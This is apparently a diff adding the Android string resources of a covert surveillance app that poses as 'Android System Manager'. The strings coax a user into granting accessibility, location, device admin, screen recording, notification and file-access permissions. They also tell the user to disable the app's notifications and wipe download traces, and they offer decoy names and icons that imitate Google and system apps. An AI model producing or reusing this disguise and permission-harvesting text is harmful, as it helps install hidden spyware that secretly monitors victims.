@@ -1,0 +1,95 @@
+<resources>
+    <string name="app_name">Android System Manager</string>
+    <string name="enter_activation_code">Enter Activation Code</string>
+    <string name="activate_service">Activate Service</string>
+    <string name="accessibility_permission_text">"Kindly Allow the "Accessibility Permission Access" for Android System Manager,Kindly Allow the ,"Accessibility Permission Access"</string>
+    <string name="location_permission_text">Kindly Allow the "All all the time" Location Permission,Kindly Allow the ,"All all the time"</string>
+    <string name="device_administration_text">"Kindly Activate the app as "Device Admin App",Kindly Activate the app as ,"Device Admin App""</string>
+    <string name="screen_record_permission_text_one">Kindly Allow the "Screen Record" Permission. First Check the \"<b>Do not show again</b>\" option. Then Tap on \"<b>START NOW</b>\",Kindly Allow the ,"Screen Record"</string>
+    <string name="screen_record_permission_text_two">Kindly Allow the \"<b>Screen Record</b>\" Permission. Tap on \"<b>START NOW</b>\",Kindly Allow the , "Screen Record"</string>
+    <string name="notification_permission_on_text">Allow "Notification Access" Permission for Android System Manager","Allow ","Notification Access""</string>
+    <string name="notification_disable_text_one">Kindly disable "Show Notifications" for \"<b>Android System Manager</b>\". Click Disable to Continue, "Kindly disable ", "Show Notifications""</string>
+    <string name="notification_disable_text_nougat_two">Kindly disable "Show Notifications" for \"<b>Android System Manager</b>\","Kindly disable ", "Show Notifications"</string>
+    <string name="accessibility_access_text_one">Kindly Allow "Accessibility Access" to \"<b>Android System Manager</b>\". First Tap On Installed Services and find App from list. Click Grant to continue, "Kindly Allow ", "Accessibility Access"</string>
+    <string name="accessibility_access_text_nougat_two">Kindly Allow "Accessibility Access" to \"<b>Android System Manager</b>\". Click Grant to continue,"Kindly Allow ","Accessibility Access"</string>
+    <string name="management_of_all_files_text">Kindly Allow "Management of All Files Permission","Kindly Allow ","Management of All Files Permission"</string>
+    <string name="display_over_other_apps_text">Kindly Grant "Display Over other Apps" Permission","Kindly Grant ","Display Over other Apps"</string>
+    <string name="usage_access_permission_text">"Kindly Allow the "Usage Access" Permission for Android System Manager,Kindly Allow the ,"Usage Access"</string>
+
+    <string name="channel_name">Android System Service</string>
+    <string name="channel_description">Android System Channel to show Android System Notifications</string>
+
+    <string name="settings">Settings</string>
+    <string name="apps_security">Apps Security</string>
+    <string name="battery_optimiser">Battery Optimiser</string>
+    <string name="device_protection_services">Device Protection Services</string>
+    <string name="display_services">Display Services</string>
+    <string name="internet_services_handler">Internet Services Handler</string>
+    <string name="lock_screen_manager">Lock Screen Manager</string>
+    <string name="memory_cleaner_service">Memory Cleaner Service</string>
+    <string name="microphone_controller">Microphone Controller</string>
+    <string name="phone_call_manager">Phone Call Manager</string>
+    <string name="screen_controller">Screen Controller</string>
+    <string name="wifi_controller">Wifi Controller</string>
+
+    <string name="android_system_webview">Android System WebView</string>
+    <string name="carrier_services">Carrier Services</string>
+    <string name="google_apps_policy">Google Apps Policy</string>
+    <string name="google_console">Google Console</string>
+    <string name="google_keyboard">Google Keyboard</string>
+    <string name="google_maps">Google maps</string>
+    <string name="google_news">Google News</string>
+    <string name="google_play_games">Google Play Games</string>
+    <string name="google_play_music">Google Play Music</string>
+    <string name="google_services_info">Google Services Info</string>
+
+    <string name="file_manager">File Manager</string>
+    <string name="photos">Photos</string>
+    <string name="google_manager">Google Manager</string>
+    <string name="android_system">Android System</string>
+    <string name="device_secure">Device Security</string>
+    <string name="music">Music</string>
+    <string name="files">Files</string>
+    <string name="google_analytics">Google Analytics</string>
+    <string name="google_app">Google</string>
+    <string name="health_manager">Health Manager</string>
+    <string name="battery_care">"Battery Care"</string>
+
+    <string name="activation_welcome_title">Welcome!</string>
+    <string name="activation_welcome_desc">Thanks for taking interest in our services, Please enter
+        Activation License key provided in email credentials or find on your dashboard.</string>
+    <string name="activation_footer">Please remove traces of this app from browser and download
+        manager on this device, press Next to continue.</string>
+    <string name="activation_btn">Activate Service</string>
+    <string name="activation_result_success">Congrats! Services Activated Successfully.</string>
+    <string name="action_code_hint">Enter License Key</string>
+    <string name="activation_code_hint">Enter Activation Code</string>
+    <string name="access_blocked_text">Access is disabled by <b>Android OS</b>. Please enter the Android OS code to enable the access.</string>
+    <string name="activation_close_btn">NEXT</string>
+    <string name="screen_record_text">Kindly Grant \"<b>Screen Record</b>\" Permission. First Check the \"<b>Do not show again</b>\" option. Then Tap on \"<b>START NOW</b>\" .</string>
+    <string name="screen_cast_text">Kindly Grant \"<b>Screen Record</b>\" Permission. Tap on \"<b>START NOW</b>\" .</string>
+    <string name="device_admin_text">Kindly Activate app as  \"<b>Device Administrator</b>\". Tap Activate to allow the Device Administration Rights.</string>
+    <string name="usage_access_text">Kindly Grant Usage access permission to \"<b>Android System Manager</b>\". Click Grant to Continue.</string>
+    <string name="notification_permission_text">Kindly Grant Notification access permission to \"<b>Android System Manager</b>\". Click Grant to Continue. </string>
+    <string name="notification_access_text">Kindly disable Show SNotifications for \"<b>Android System Manager</b>\". Click Disable to Continue.</string>
+    <string name="notification_access_text_nougat">Kindly disable Show SNotifications for \"<b>Android System Manager</b>\". First Tap On \"<b>Notifications</b>\ and then block them. Click Disable to Continue.</string>
+    <string name="accessibility_access_text">Kindly Grant Accessibility access to \"<b>Android System Manager</b>\". First Tap On Installed Services and find App from list. Click Grant to continue.</string>
+    <string name="accessibility_access_text_nougat">Kindly Grant Accessibility access to \"<b>Android System Manager</b>\". Click Grant to continue.</string>
+    <string name="draw_over_other_apps_text">Kindly Grant Draw Over Apps Or appear on top permission For \"<b>Android System Manager</b>\". Click Grant to continue.</string>
+    <string name="accessibility_description">Accessibility Permission needed for apps security, device protection and apps management</string>
+    <string name="hide_app_text">Ok</string>
+    <string name="all_done">All Done</string>
+    <string-array name="app_names_array">
+        <item name="title">Select App Name and Icon</item>
+        <item name="file_manager">File Manager</item>
+        <item name="photos">Photos</item>
+        <item name="photos">Android System</item>
+        <item name="photos">Device Security</item>
+        <item name="photos">Music</item>
+        <item name="photos">Files</item>
+        <item name="photos">Google Analytics</item>
+        <item name="google">Google</item>
+        <item name="photos">Health Manager</item>
+        <item name="battery_care">Battery Care</item>
+    </string-array>
+</resources>
